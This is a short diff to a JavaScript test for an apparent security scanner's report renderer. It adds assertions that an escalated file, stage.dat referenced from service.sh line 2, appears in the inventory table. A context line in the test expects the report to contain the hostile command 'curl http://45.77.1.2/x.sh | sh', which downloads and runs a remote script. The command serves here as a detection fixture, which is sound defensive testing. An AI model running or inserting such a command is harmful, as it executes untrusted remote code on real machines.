@@ -908,6 +908,8 @@ test('端到端：升级链路在报告里看得见（escalated + inventory + Ma
   const md = renderMarkdown(r);
   assert.match(md, /被脚本引用而\*\*升级进扫描面\*\*的条目/);
   assert.match(md, /stage\.dat/);
+  assert.ok(md.includes('| 被引用升级（原本不在扫描面） | `stage.dat` |'), '文件清单表里也要有它一行');
+  assert.match(md, /`service\.sh:2`/);
   assert.match(md, /## 脚本全文[\s\S]*curl http:\/\/45\.77\.1\.2\/x\.sh \| sh/);
   const j = JSON.parse(renderJSON(r));
   assert.deepEqual(j.escalated, r.escalated, 'escalated 是报告字段，不是 finding，JSON 里原样保留');
